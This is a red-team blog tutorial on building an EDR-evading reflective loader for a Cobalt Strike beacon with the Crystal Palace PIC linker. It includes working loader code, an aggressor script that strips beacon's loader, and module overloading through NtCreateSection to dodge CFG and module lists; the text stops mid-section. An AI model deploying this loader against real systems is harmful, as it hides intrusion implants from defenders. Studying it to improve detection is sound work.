# https://lorenzomeacci.com/bypassing-edr-in-a-crystal-clear-way

# Bypassing EDR in a Crystal Clear Way

Most operators spend days engineering the perfect shellcode loader and ship the payload naked. This blog takes you from how C2 payloads actually work under the hood all the way to building a fully evasive reflective loader that bypasses one of the best EDR's, covering module overloading with .pdata registration, NtContinue entry transfer, API call stack spoofing with Draugr, sleep masking, and Crystal Palace YARA signature removal. Every technique explained from why it exists, not just how it works.

RED TEAM PATH

Lorenzo Meacci @kapla

3/15/202634 min read

![](https://assets.zyrosite.com/cdn-cgi/image/format=auto,w=1024,h=473,fit=crop/m6LJpDPKBDH0E9ZB/image_2026-03-14_152501086-B7neM3or7SGhnaVm.png)

![](https://assets.zyrosite.com/cdn-cgi/image/format=auto,w=375,h=173,fit=crop/m6LJpDPKBDH0E9ZB/image_2026-03-14_152501086-B7neM3or7SGhnaVm.png)

# Introduction

Hey everyone, it's been a while since my last post, and trust me it wasn't because I got lazy. I've been working on what you're about to read for the past three months, with some school revision and a well deserved vacation somewhere in between.

In this blog I want to take you on a full trip, starting from how C2 payloads actually work under the hood, all the way to building a reflective loader that bypasses one of the best EDRs available. [THE SOURCE IS](https://github.com/kapla0011/KaplaStrike)[HERE](https://github.com/kapla0011/KaplaStrike). But more than just showing you the techniques, I want to explain why we're using them and what specific problem each one is solving. Randomly throwing evasion techniques at a target without understanding them is a great way to get caught. Evasion is a cat and mouse game and the only way to stay ahead is to actually understand what the EDR is looking at. I already covered static analysis evasion in depth **_[here](https://lorenzomeacci.com/bypassing-static-analysis-deep-dive)_**, so this time we're going deeper into runtime, what happens when your payload loads itself into memory and starts doing its thing.

By the end of this you won't just know how this loader works. You'll understand every design decision behind it and why it would have been caught without it.

# The Problem

![](https://assets.zyrosite.com/cdn-cgi/image/format=auto,w=1024,h=282,fit=crop/m6LJpDPKBDH0E9ZB/image_2026-03-14_154100145-zz6Igc7UPWA9MSJ4.png)

![](https://assets.zyrosite.com/cdn-cgi/image/format=auto,w=375,h=103,fit=crop/m6LJpDPKBDH0E9ZB/image_2026-03-14_154100145-zz6Igc7UPWA9MSJ4.png)

Even if you have never looked at a call stack before, and without reading the "BAD" and "GOOD" labels I drew on the images, you can probably tell that the one on the left looks a bit off. We will go deeper on why in a moment, but first let me give you a quick overview of what an EDR is actually looking at.

## **Static Analysis**

This has been covered extensively in previous blogs and there is even a dedicated post on it **_[here](https://lorenzomeacci.com/bypassing-static-analysis-deep-dive)_**, but to keep it quick: static analysis is the stage where a file on disk gets scanned for known signatures associated with specific malware families, high entropy (encrypted content inside an executable is suspicious by default), or combinations of APIs that together are commonly associated with malicious behaviour. A classic example would be WinHTTP APIs chained with VirtualAlloc, memcpy, VirtualProtect and CreateThread, which is a pretty reliable fingerprint for a shellcode loader that downloads and executes a payload in a separate thread.

## **Behavioral Analysis**

Behavioral analysis is more complex and studies the payload at runtime in several different ways.

**API Hooking**

APIs can be hooked in multiple ways, but the most common approach involves placing a trampoline, normally a jmp instruction, inside the module where the API lives. To understand why, it helps to know how a typical API call flows through the system. If you call CreateFileA from kernel32.dll, that call gets forwarded to KernelBase.dll, which converts the ANSI string to a wide Unicode string and calls CreateFileW, which eventually calls NtCreateFile in ntdll.dll where the actual syscall instruction lives. Most EDRs hook at the ntdll.dll level rather than kernel32.dll because hooking the higher level wrappers is trivially bypassed by calling the NT function directly. The trampoline placed in ntdll.dll redirects execution into a controlled EDR function that inspects the call, and if the behaviour looks suspicious, for example multiple APIs chained together in a pattern that resembles a known injection technique, the EDR can kill the process. If the call looks benign, execution is returned to the application transparently.

**Kernel Callbacks and Kernel telemetry**

The most advanced solutions go beyond userland hooking entirely and use kernel drivers to get a complete view of what is happening on the system. A kernel callback is a registered event inside the driver that gets triggered when something specific occurs, such as a new process being created, memory being allocated, or a thread starting. There is no way to bypass these callbacks from userland. To combat them you would need to operate at the same level, in kernel mode, with your own driver, either signed with a leaked certificate or loaded via a vulnerable driver to disable the callbacks directly. That is well out of scope for this blog, but worth knowing about.

On the telemetry side, ETW-TI (Event Tracing for Windows Threat Intelligence) is a modern and significantly more powerful implementation of the standard ETW framework. Unlike regular ETW which lives in userland, ETW-TI runs at the kernel level, meaning it has visibility into things like process creation, memory allocation patterns, and thread activity that userland simply cannot observe with the same fidelity. Because it lives in the kernel, blinding it from userland is not an option without a driver of your own. The good news for us is that the standard userland ETW implementation is still heavily relied upon by a large number of EDR solutions, and that one we can deal with. We will cover how later in the blog.

**Call Stack Inspection**

The call stack is one of the most important things modern EDRs check on a running thread. We will go much deeper on exactly how call stacks work later, but for now just know that the stack is used to track return addresses so the CPU knows where to resume execution after a function finishes, store local variables, pass arguments to functions, and handle exceptions. Every thread has its own call stack. EDRs can inspect it by briefly freezing the thread and taking a snapshot, or by using kernel level telemetry to observe it in real time. And they do not just look at the stack and say “yeah seems good to me”. Modern solutions walk down the frames actively looking for anomalies, for example return addresses pointing into memory regions that have no backing file on disk, which is a reliable indicator that something was injected rather than loaded legitimately. That is exactly the problem we are going to solve.

**Memory Scanning**

Worth mentioning briefly before we move on: EDRs do not always kill a process the moment something suspicious is detected. In many cases a single IOC triggers a reactive memory scan of the offending process rather than an immediate termination. This means that even if your payload slips past the initial behavioral checks, having recognisable signatures sitting in memory, whether that is a plaintext beacon DLL, a known string, or a suspicious memory region with no backing file, can still get you caught at that stage

![](https://assets.zyrosite.com/cdn-cgi/image/format=auto,w=1024,h=110,fit=crop/m6LJpDPKBDH0E9ZB/image_2026-03-14_153113450-tu4eAiV2qPx49V65.png)

![](https://assets.zyrosite.com/cdn-cgi/image/format=auto,w=375,h=34,fit=crop/m6LJpDPKBDH0E9ZB/image_2026-03-14_153113450-tu4eAiV2qPx49V65.png)

Those are the main detection vectors but there are other IOCs we need to keep in mind as well. A classic one is executing a payload from unbacked memory that was allocated as RWX. Some payloads do not even need write permissions at runtime and only require it during memory encryption at sleep time, so a cleaner approach is to set permissions dynamically depending on what the payload is actually doing at that moment, for example RX during execution and RW during the sleep cycle when we need to encrypt the sections.

That said, there are legitimate cases where RWX memory exists by design, the most common example being web browsers that use JIT compilation to dynamically generate and execute code at runtime. This is actually a useful thing to keep in mind when choosing an injection candidate, a process that legitimately uses RWX memory gives you some natural cover.

# **C2 Payload Architecture**

Before we get into the techniques, we need to establish how most C2 implants are actually structured and why, with a quick detour into the history of payload architecture. Although I will be using Cobalt Strike for this blog, the concepts here apply equally to the vast majority of C2 frameworks out there, open source or otherwise.

## **What is the payload**

Most C2 payloads are implemented as a standard Windows DLL that needs to be loaded into memory in one way or another. You already know that dropping artifacts directly to disk is a bad idea since they are immediately exposed to static analysis and signature scanning. But even beyond that, loading a beacon DLL directly from disk using something like rundll32 creates its own problems. Cobalt Strike's DLL exports a special function called StartW specifically because starting execution from DllMain directly is risky. In most cases it will cause a deadlock because the Windows loader, the component responsible for loading the DLL, actively blocks network operations from within DllMain. You could work around this by spawning a new thread from DllMain, but that still does not solve the fundamental problem that your artifact is sitting on disk and exposed.

So the question becomes: how do we load a DLL payload entirely from memory?

## **Reflective DLL Injection (rDLL)**

About fifteen years ago Stephen Fewer answered that question with the first implementation of Reflective DLL Injection. The idea is elegant: instead of relying on the Windows loader to map the DLL into memory and handle all the setup steps, why not make the DLL do it itself?

A Reflective DLL is a special kind of DLL that acts as a position independent payload. Regardless of where it ends up in memory, if you jump to the right place it will just work. To make this possible the DLL exports a special function, conventionally named ReflectiveLoader, which is responsible for performing all the steps that the Windows loader would normally handle:

- Allocate enough memory to hold the DLL image

- Copy the DLL sections into that allocated memory

- Fix the base relocations

- Resolve the Import Address Table (IAT)

- Set the correct memory permissions for each section

- Call the DLL entry point


This was a massive step forward, but it comes with a limitation: to actually trigger the ReflectiveLoader you still need an external loader that can find the exported function and call it, so the payload is not actually independent. That external loader needs parse the DLL and calculate the Offset of the ReflectiveLoader function and then call it. It works, but it ties your injection technique to a specific loader implementation and reduces flexibility.

![](https://assets.zyrosite.com/cdn-cgi/image/format=auto,w=768,h=577,fit=crop/m6LJpDPKBDH0E9ZB/image_2026-03-14_153327389-PPwWwwN5igj63lBa.png)

![](https://assets.zyrosite.com/cdn-cgi/image/format=auto,w=375,h=275,fit=crop/m6LJpDPKBDH0E9ZB/image_2026-03-14_153327389-PPwWwwN5igj63lBa.png)

## **Shellcode Reflective DLL Injection (sRDI)**

![](https://assets.zyrosite.com/cdn-cgi/image/format=auto,w=768,h=455,fit=crop/m6LJpDPKBDH0E9ZB/image_2026-03-14_153422535-226qY29B9yKtTJkk.png)

![](https://assets.zyrosite.com/cdn-cgi/image/format=auto,w=375,h=229,fit=crop/m6LJpDPKBDH0E9ZB/image_2026-03-14_153422535-226qY29B9yKtTJkk.png)

sRDI is the natural evolution of rDLL and it comes in multiple flavours. Fortra illustrated the two main differences in how these loaders can be applied: the first one, the original approach, places a small shellcode stub inside the DOS header responsible for finding the exported ReflectiveLoader function and calling it; the second one, the more modern approach, has the full reflective loading steps prepended to the DLL payload entirely. This second approach is the one we will be using today and it has a significant advantage over Stephen Fewer's original implementation. The DLL can now be any DLL, it does not need to have the reflective loading steps compiled into it, because all the loading logic is handled entirely by the prepended loader. This makes the technique modular: you can swap the loader independently of the payload.

But sRDI still has a fundamental problem that neither Stephen Fewer's original design nor any of its derivatives actually solve.

When the default reflective loader runs, the DLL gets allocated into private unbacked memory using something like VirtualAlloc, and the entry point gets called from there. From that point forward the payload is running from a memory region that Windows has no record of, no backing file, no module entry, nothing. As you can imagine, any API call originating from unbacked memory is a clear indicator of injection, with the exception of the legitimate cases we discussed earlier. And the return addresses pushed onto the call stack point directly into the .text section of the beacon payload or the reflective loader itself, which is exactly what you saw in the bad call stack at the top of this post.

![](https://assets.zyrosite.com/cdn-cgi/image/format=auto,w=768,h=311,fit=crop/m6LJpDPKBDH0E9ZB/image_2026-03-14_154119967-41qDVE099UNStAfh.png)

![](https://assets.zyrosite.com/cdn-cgi/image/format=auto,w=375,h=191,fit=crop/m6LJpDPKBDH0E9ZB/image_2026-03-14_154119967-41qDVE099UNStAfh.png)

This is the problem we are solving. Let's get into how.

## **User-Defined Reflective Loader (UDRL)**

The UDRL was first introduced in Cobalt Strike 4.4 and gives the operator full control over every stage of the reflective loading process. Instead of being stuck with the default loader behaviour, you can plug in your own implementation entirely. Worth noting that the UDRL is a Cobalt Strike specific concept, and while other commercial C2 frameworks probably offer something similar, most open source ones do not have a dedicated interface for it. That said, nothing stops an operator from just modifying the reflective loader source directly since it is open source anyway. Havoc for example has its reflective loader implemented [here](https://github.com/HavocFramework/Havoc/blob/main/payloads/DllLdr/Source/Entry.c) and you can change whatever you want.

This is where things get interesting though. I first came across the Crystal Palace project through a blog post by @RastaMouse, and that is the framework we will be using today to build our loader. The reason I chose it over writing something from scratch is that Crystal Palace is completely C2 agnostic. It can be integrated with most C2 frameworks without touching their source code, with some exceptions depending on how the framework handles its payload format. We will get into exactly how it works in the next section.

# **PIC, COFF, and Crystal Palace**

**What is PIC?**

PIC stands for Position Independent Code, and as the name suggests it means that no matter where in memory the code ends up, it just works. Easier said than done though.

To understand why this is non-trivial, we need to briefly talk about what happens when you write a normal C program. When you hit compile, two distinct things happen under the hood that most people mentally lump together as one step.

The **compiler** takes your .c source files and transforms each one independently into a COFF object file (.o). At this stage the compiler has no idea where anything else lives in memory. It produces machine code with placeholder addresses wherever something external is referenced, and it records those placeholders as **relocations**, essentially a list of "fix this address later" entries. The object file is not executable at this point.

The **linker** then takes all those .o files and combines them into a final executable (.exe, .dll, .elf). It resolves all the relocations, assigns final addresses to everything, and produces something the OS can actually load and run.

Crystal Palace is a **PIC linker**, not a compiler. It takes your compiled COFF object files and instead of producing a PE executable, it extracts the .text section and patches all the relocations in a way that makes the code position independent. Understanding this distinction matters because it explains why the rules of PIC programming exist: you are essentially trying to produce object files that have no relocations the linker cannot resolve at link time by pure offset calculation.

Before we get to the rules, one more concept worth clarifying: the difference between a variable **declaration** and a **definition**. A declaration tells the compiler a variable exists somewhere: extern int i;. A definition actually allocates memory for it: int i = 0;. Global variable definitions end up in the .data section if they are initialised, or .bss if they are not. This matters for PIC because those sections live at a fixed address in a normal executable, but in a position independent blob there is no fixed address. Any reference to a global variable generates a relocation in .text, and that relocation will break your PIC.

With that in mind, the rules:

The rules boil down to a few things: go() must be the first function in the file with nothing before it, no global or static variable definitions, no string literals, no direct Win32 API calls via standard includes, and no switch statements. The underlying reason for all of them is the same: anything that generates a relocation in .text will break your PIC. If you want to go deeper on why each rule exists at the assembly level, Raphael Mudge covers it exhaustively in his crash course [here](https://vimeo.com/1100089433).

If you follow all of these rules and compile your code, in theory your .text section should contain zero relocations and the raw bytes can be extracted, injected anywhere in memory, and executed directly. In theory. In practice, this is painful enough that people invented Crystal Palace to give most of those things back.

Enough theory let's get into PIC programming and get our hand dirty!

We are going to take a simple MessageBox example and progressively transform it into valid PIC, hitting every rule we just talked about along the way.

**Step 1: The naive approach**

Let's start with the most obvious thing you could write:

```

#include <windows.h>

void go() {
    MessageBoxA(NULL, "Hello World!", "Kapla Test", NULL);
}
```

Compile it as a COFF object file:

```

x86_64-w64-mingw32-gcc -c msg_box.c -o msg_box.o
```

Now let's look at the relocations in the .text section:

````

x86_64-w64-mingw32-objdump -r msg_box.o
```
```
RELOCATION RECORDS FOR [.text]:
OFFSET           TYPE              VALUE
0000000000000011 IMAGE_REL_AMD64_REL32  .rdata
0000000000000018 IMAGE_REL_AMD64_REL32  .rdata
0000000000000027 IMAGE_REL_AMD64_REL32  __imp_MessageBoxA
````

Three relocations in .text. Two of them are the string literals "Hello World!" and "Kapla Test" living in .rdata, and the third is MessageBoxA itself being resolved via the IAT. None of these can be fixed at runtime in a raw PIC blob. We need to eliminate all of them.

**Step 2: Fix the API resolution**

The first problem is MessageBoxA. We have no IAT, so we cannot call it directly. We need to resolve it manually at runtime by walking the PEB, finding kernel32.dll, and parsing its export address table to get LoadLibraryA and GetProcAddress. From those two we can resolve everything else.

This is where resolve\_eat.h comes in. It is a helper header that ships with the Crystal Palace examples and implements findModuleByHash() and findFunctionByHash(), which walk the PEB and parse the EAT using ROR13 hashes instead of plain strings so we do not introduce new string relocations. You can grab it by downloading the Crystal Palace examples from [tradecraftgarden.org](http://tradecraftgarden.org/).

We build a function table struct to hold our resolved pointers:

```

void RunningCode();

void go() {
    RunningCode();
}

#include "loaderdefs.h"
#include "loader.h"
#include "resolve_eat.h"

#define WIN32_FUNC(x) __typeof__(x) * x

typedef struct {
    WIN32_FUNC(LoadLibraryA);
    WIN32_FUNC(GetProcAddress);
} WIN32FUNCS;

#define KERNEL32DLL_HASH    0x6A4ABC5B
#define LOADLIBRARYA_HASH   0xEC0E4E8E
#define GETPROCADDRESS_HASH 0x7C0DFCAA

void findNeededFunctions(WIN32FUNCS * funcs) {
    char * hModule = (char *)findModuleByHash(KERNEL32DLL_HASH);
    funcs->LoadLibraryA   = (__typeof__(LoadLibraryA) *)   findFunctionByHash(hModule, LOADLIBRARYA_HASH);
    funcs->GetProcAddress = (__typeof__(GetProcAddress) *) findFunctionByHash(hModule, GETPROCADDRESS_HASH);
}
```

Notice that go() is declared at the very top of the file before the includes. This is the rule we talked about earlier: the entry point must be first.

**Step 3: Fix the strings**

We still have the string literals "user32" and "MessageBoxA" which live in .rdata and generate relocations. The fix is stack strings: instead of string literals, we declare character arrays on the stack at runtime. These live relative to RSP and generate no relocations:

```

void RunningCode() {
    WIN32FUNCS funcs;
    findNeededFunctions(&funcs);

    WIN32_FUNC(MessageBoxA);

    // stack strings, no .rdata relocations
    char user32[] = {'u','s','e','r','3','2',0};
    char msgbox[] = {'M','e','s','s','a','g','e','B','o','x','A',0};

    HANDLE hUser32 = funcs.LoadLibraryA(user32);
    MessageBoxA = (__typeof__(MessageBoxA))funcs.GetProcAddress(hUser32, msgbox);
    MessageBoxA(NULL, msgbox, msgbox, MB_OK);
}
```

Now if we check the relocations again:

````

x86_64-w64-mingw32-objdump -r crystal_box.o
```
```
RELOCATION RECORDS FOR [.pdata]:
OFFSET           TYPE              VALUE
0000000000000000 IMAGE_REL_AMD64_ADDR32NB  .text
0000000000000004 IMAGE_REL_AMD64_ADDR32NB  .text
0000000000000008 IMAGE_REL_AMD64_ADDR32NB  .xdata
````

Zero relocations in .text. And the only relocations are in .pdata which is the exception handling metadata and is not part of the executable code. We can now get the .text section and execute it with a classic shellcode loader:

```

x86_64-w64-mingw32-gcc -DWIN_X64 -c crystal_box.c -o crystal_box.o
x86_64-w64-mingw32-objcopy --dump-section .text=out.bin crystal_box.o
```

And it works!

![](https://assets.zyrosite.com/cdn-cgi/image/format=auto,w=1024,h=121,fit=crop/m6LJpDPKBDH0E9ZB/image_2026-03-14_155441586-QUpBjPHO4XKEIl4h.png)

![](https://assets.zyrosite.com/cdn-cgi/image/format=auto,w=375,h=43,fit=crop/m6LJpDPKBDH0E9ZB/image_2026-03-14_155441586-QUpBjPHO4XKEIl4h.png)

As you can see, this is a pain in the a... ankle. It becomes tedious and error prone to write everything this way at scale, and for a full C2 loader with dozens of API calls and multiple source files it would be a nightmare to maintain. This is exactly why frameworks like Crystal Palace and Stardust were created.

**Crystal Palace... so what do we get back?**

Crystal Palace is a PIC linker created by Raphael Mudge, the original creator of Cobalt Strike, and it gives back the level of abstraction that makes writing PIC code actually bearable. Strings work again. Global variables work again. Win32 API calls work again through a system called DFR (Dynamic Function Resolution), which will feel immediately familiar if you have written BOFs before since it uses the exact same MODULE$Function syntax.

But that is not the whole story. The more interesting feature of Crystal Palace is that it lets you compose individual pieces of tradecraft at link time. Call stack spoofing can live in one COFF file, API hooking in another, sleep masking in another, and Crystal Palace stitches them all together into a single PIC blob at build time. Each component can be swapped out independently as long as it follows the same interface, which means you can upgrade or replace one technique without touching the rest of the loader.

This is the reason PICOs exist. PICO stands for Position Independent Code Object, and it is Crystal Palace's convention for running COFF files from within PIC code. Each PICO lives

in a separated memory region from the other, meaning they can be freed at any time and each one responsible for specific tasks.

The whole orchestra is led by the specification file, which has many, MANY commands in it, for the full list refer to the Crystal palace documentation at: [https://tradecraftgarden.org/docs.html](https://tradecraftgarden.org/docs.html)

But here are the basics and most important ones:

- **load** — loads a compiled COFF object file into the build

- **make pic** — merges .text and .rdata together and produces a 64 bit PIC blob, giving you strings and constants back. +optimize... optimizes code

- **dfr** — enables Dynamic Function Resolution, unlocking the MODULE$Function syntax that automatically resolves Win32 APIs at runtime by walking the PEB, it's important to note that the function responsible for this needs to me coded into your loader

- **mergelib** — merges a static library into the build, used to bring in the TradecraftGarden helper library

- **attach** — intercepts a Win32 API (INSIDE YOUR LOADER/COFF'S) call and redirects it to your own function at link time.

- **addhook** — It's used to register hooked functions which are then used by the \_\_resolve\_hook() intrinsic

- **export** — writes the final PIC blob to an output file


**What does all of this mean for us?**

With this kind of flexibility we can intercept as many functions as we want and completely change how a DLL behaves at run time, on top of having full control over every stage of the loading process itself. We decide how memory gets allocated, how the IAT gets resolved, how the entry point gets called, and what happens at every sleep cycle. Nothing is left to the default loader behaviour, and that is exactly the level of control we need to make this loader and DLL evasive end to end.

# **A Simple UDRL with Crystal Palace**

Before we start layering evasion techniques on top of each other, we need a working baseline. Something that loads beacon correctly, checks in, and gives us a clear picture of every detection we are about to fix. That baseline is simple\_rdll.

**Getting the raw beacon DLL**

The first thing we need to sort out is payload generation. By default Cobalt Strike prepends its own reflective loader to the beacon DLL before handing it to you. Since we are providing our own loader via Crystal Palace, we do not want that. We just want the raw DLL with nothing attached.

This is handled by a CNA aggressor script that hooks two events in the Cobalt Strike payload pipeline. Credit to naksyn for the original script which you can find at [https://naksyn.com/cobalt%20strike/2024/07/02/raising-beacons-without-UDRLs-teaching-how-to-sleep.html](https://naksyn.com/cobalt%20strike/2024/07/02/raising-beacons-without-UDRLs-teaching-how-to-sleep.html):

```

set BEACON_RDLL_SIZE {
    warn("Running 'BEACON_RDLL_SIZE' for DLL " .$1. " with architecture " .$2);
    return "0";
}

set BEACON_RDLL_GENERATE {
    local('$arch $beacon $fileHandle $ldr $path $payload');
    $beacon = $2;
    $arch = $3;
    return $beacon;
}
```

Cobalt Strike 4.9 introduced official support for beacon without the reflective loader function entirely. As Fortra document in their [release notes](https://www.cobaltstrike.com/blog/cobalt-strike-49-take-me-to-your-loader), returning "0" from BEACON\_RDLL\_SIZE now strips the entire reflective loader space from the beacon DLL before it reaches BEACON\_RDLL\_GENERATE, giving you a clean raw DLL with nothing prepended. Worth noting that prior to 4.9 the default return value for BEACON\_RDLL\_SIZE was 0, meaning this behaviour was previously the default. From 4.9 onwards it was changed to 5 to accommodate the new prepend style UDRL support, so explicitly returning "0" is now required to get the raw DLL.

So once you load this CNA in your Cobalt strike client generate a **raw** payload and that will be our beacon

_note: newer versions of Cobalt Strike ship with an updated Java runtime that is compatible with Crystal Palace, meaning you can import it directly into the client and use its API to generate the PIC blob on the fly. Older versions however run on an older Java version that is not compatible, so if you are not on the latest client you will need to adopt the offline approach we are using here, compiling and linking the blob manually and passing it in via BEACON\_RDLL\_GENERATE. Either way the end result is identical, it is just a matter of how the blob gets built and handed to the pipeline._

**The loader**

The spec file is minimal:

```

x64:
    load "bin/loader.x64.o"
        make pic +gofirst
        dfr "resolve" "ror13"
        mergelib "../libtcg/libtcg.x64.zip"

        push $DLL
            link "cobalt_dll"

        export
```

make pic +gofirst produces the PIC blob with go() guaranteed first. dfr enables Dynamic Function Resolution so we can use the MODULE$Function syntax (remember that the resolve function needs to be present inside your loader). mergelib brings in the TradecraftGarden helper library. The push $DLL and link "cobalt\_dll" directives append the beacon DLL to the blob and make it accessible via the cobalt\_dll section reference. The final PIC blob is produced with:

```

./link ./loader.spec beacon.dll simple_rdll.bin
```

And the loader itself:

```

#include <windows.h>
#include "tcg.h"

WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize,
                                                DWORD flAllocationType, DWORD flProtect);

/* DFR resolver — Crystal Palace calls this when resolving MODULE$Function references */
FARPROC resolve(DWORD modHash, DWORD funcHash) {
    HANDLE hModule = findModuleByHash(modHash);
    return findFunctionByHash(hModule, funcHash);
}

/* Crystal Palace convention for accessing data linked into the cobalt_dll section */
char __DLLDATA__[0] __attribute__((section("cobalt_dll")));

char * findAppendedDLL() {
    return (char *)&__DLLDATA__;
}

void go() {
    char        * dst;
    char        * src;
    DLLDATA       data;
    IMPORTFUNCS   funcs;

    funcs.GetProcAddress = GetProcAddress;
    funcs.LoadLibraryA   = LoadLibraryA;

    /* find the beacon DLL appended to this PIC blob */
    src = findAppendedDLL();
    ParseDLL(src, &data);

    /* allocate at beacon's preferred base address */
    ULONGLONG preferred = data.NtHeaders->OptionalHeader.ImageBase;
    dst = KERNEL32$VirtualAlloc(
        (LPVOID)preferred,
        SizeOfDLL(&data),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    /* copy sections into allocated memory */
    LoadDLL(&data, src, dst);

    /* fix the IAT */
    ProcessImports(&funcs, &data, dst);

    /* call the entry point */
    DLLMAIN_FUNC entry = EntryPoint(&data, dst);
    entry((HINSTANCE)dst, DLL_PROCESS_ATTACH, NULL);
    entry((HINSTANCE)NULL, 0x4, NULL);
}
```

One thing worth explaining here is why we allocate at beacon's preferred base address rather than letting VirtualAlloc pick an arbitrary one. When you allocate at ImageBase, the delta between the actual load address and the address beacon expects to live at is zero. ProcessRelocations would have nothing to patch since every hardcoded absolute address already points exactly into your allocation. This means the loader works correctly regardless of whether the Malleable C2 profile strips the .reloc section or not, which gives you one less thing to worry about operationally.

**It works**

![](https://assets.zyrosite.com/cdn-cgi/image/format=auto,w=1024,h=65,fit=crop/m6LJpDPKBDH0E9ZB/image_2026-03-14_160017179-FOvH9d4G1HmZwedM.png)

![](https://assets.zyrosite.com/cdn-cgi/image/format=auto,w=375,h=18,fit=crop/m6LJpDPKBDH0E9ZB/image_2026-03-14_160017179-FOvH9d4G1HmZwedM.png)

Beacon checks in cleanly. The loader is working. Now let's look at what an EDR sees.

**The problem**

![](https://assets.zyrosite.com/cdn-cgi/image/format=auto,w=768,h=384,fit=crop/m6LJpDPKBDH0E9ZB/image_2026-03-14_160145137-C1obMaXZzBbI1gS3.png)

![](https://assets.zyrosite.com/cdn-cgi/image/format=auto,w=375,h=202,fit=crop/m6LJpDPKBDH0E9ZB/image_2026-03-14_160145137-C1obMaXZzBbI1gS3.png)

The call stack is the first problem. Frames 0 and 1 are legitimate, NtDelayExecution and SleepEx as expected for a sleeping beacon. But frames 2 and 3 are raw hex addresses with no module name attached. Those are return addresses pointing directly into beacon's .text section sitting in private unbacked memory. Any EDR doing call stack inspection sees this immediately.

![](https://assets.zyrosite.com/cdn-cgi/image/format=auto,w=1024,h=35,fit=crop/m6LJpDPKBDH0E9ZB/image_2026-03-14_160256797-WKAL30nUVEkYyJzD.png)

![](https://assets.zyrosite.com/cdn-cgi/image/format=auto,w=375,h=10,fit=crop/m6LJpDPKBDH0E9ZB/image_2026-03-14_160256797-WKAL30nUVEkYyJzD.png)

The memory region is the second problem. Private: Commit means MEM\_PRIVATE, no backing file, nothing on disk that this memory corresponds to. And it is RWX for the entire lifetime of the allocation, which is one of the most reliable indicators of injected shellcode there is.

![](https://assets.zyrosite.com/cdn-cgi/image/format=auto,w=1024,h=107,fit=crop/m6LJpDPKBDH0E9ZB/image_2026-03-14_160351060-gWUHLiYlsWQvbb4u.png)

![](https://assets.zyrosite.com/cdn-cgi/image/format=auto,w=375,h=46,fit=crop/m6LJpDPKBDH0E9ZB/image_2026-03-14_160351060-gWUHLiYlsWQvbb4u.png)

Beacon is unobfuscated the whole time, both when the shellcode is fetched and when it is loaded in memory, so one memory scan and we are fried.

This is just a handful of rules that get triggered when loading C2 payloads using this approach:

![](https://assets.zyrosite.com/cdn-cgi/image/format=auto,w=1024,h=282,fit=crop/m6LJpDPKBDH0E9ZB/image_2026-03-14_160458766-tQiXL6vIW7XDfT8l.png)

![](https://assets.zyrosite.com/cdn-cgi/image/format=auto,w=375,h=138,fit=crop/m6LJpDPKBDH0E9ZB/image_2026-03-14_160458766-tQiXL6vIW7XDfT8l.png)

# **Advanced Module Overloading**

Module overloading involves loading a legitimate DLL from disk and overwriting all of its sections with our beacon payload. When this happens every call beacon makes originates from memory backed by a real DLL on disk, solving the MEM\_PRIVATE problem entirely.

There are some prerequisites for this to work though.

The sacrificial DLL needs to be large enough that once mapped into memory it can host the entire beacon payload. How we load it also matters: LoadLibraryA is off the table because Control Flow Guard will block the indirect call to beacon's entry point. We need to map the DLL without going through LoadLibraryA, which we will cover shortly.

Finally, and this is important: even with beacon correctly stomped into the sacrificial DLL, the call stack will only be partially clean. To get clean call stack frames for beacon at runtime we also need to register beacon's .pdata section with the OS via RtlAddFunctionTable. Without this Windows cannot unwind through beacon's frames correctly, which is itself a detectable anomaly. This still leaves the UDRL frames at the bottom of the stack exposed, but that is a separate problem we will address in the next section.

**Loading the Sacrificial DLL**

The first thing we need to do is get the sacrificial DLL into memory without touching LoadLibraryA. The reason is Control Flow Guard: when a DLL is loaded via LoadLibraryA, CFG registers all of its valid indirect call targets. Calling beacon's entry point as an indirect call through our loader would then get validated against that bitmap and blocked. We need the DLL mapped into memory without CFG getting involved.

The solution is NtCreateSection + NtMapViewOfSection:

```

hFile = KERNEL32$CreateFileW(szDllFilePath, GENERIC_READ, FILE_SHARE_READ,
                              NULL, OPEN_EXISTING, 0, NULL);

status = NTDLL$NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL,
                                NULL, PAGE_READONLY, SEC_IMAGE, hFile);
KERNEL32$CloseHandle(hFile);

status = NTDLL$NtMapViewOfSection(hSection, (HANDLE)-1, &mapped,
                                   0, 0, NULL, &viewSize,
                                   ViewShare, 0, PAGE_READWRITE);
NTDLL$NtClose(hSection);
```

We open a handle to the DLL file on disk with CreateFileW, then create a section object backed by that file using NtCreateSection with SEC\_IMAGE, which tells the kernel to treat it as a PE image. NtMapViewOfSection then maps a view of that section into the current process. The key difference from LoadLibraryA is that this path does not go through the Windows loader, so CFG enforcement never happens and the DLL never appears in the PEB module list.

The result is the sacrificial DLL mapped into memory at a legitimate SEC\_IMAGE backed address, writable, and invisible to the loader list.

**The stomping sequence - Size check**

Before touching anything we verify the sacrificial DLL is actually large enough to host beacon:

```

SIZE_T sacrificialSize = (SIZE_T)pSacNt->OptionalHeader.SizeOfImage;
SIZE_T beaconSize      = (SIZE_T)SizeOfDLL(&cobaltData);

if (beaconSize > sacrificialSize) {
    KERNEL32$VirtualFree(dll_raw_src, 0, MEM_RELEASE);
    return;
}
```

SizeOfImage from the sacrificial DLL's optional header gives us the total size of the mapped image in memory. If beacon is larger we bail out. Picking a sacrificial DLL that is comfortably larger than beacon is an operational consideration worth getting right upfront.

**Making the memory writable**

SEC\_IMAGE views have per-section memory protections enforced by the kernel, so a single VirtualProtect on the base address is not reliable. We need to walk the sacrificial DLL's section table and unprotect each section individually:

```

KERNEL32$VirtualProtect(hSacrificial, 0x1000, PAGE_READWRITE, &oldProt);

PIMAGE_SECTION_HEADER pSacSec = IMAGE_FIRST_SECTION(pSacNt);
for (DWORD i = 0; i < pSacNt->FileHeader.NumberOfSections; i++) {
    if (!pSacSec[i].VirtualAddress) continue;
    SIZE_T secSize = pSacSec[i].SizeOfRawData
                   ? pSacSec[i].SizeOfRawData
                   : pSacSec[i].Misc.VirtualSize;
    if (!secSize) continue;
    KERNEL32$VirtualProtect(
        (PVOID)((ULONG_PTR)hSacrificial + pSacSec[i].VirtualAddress),
        secSize, PAGE_READWRITE, &oldProt);
}
```

**Zeroing, copying, and fixing imports**

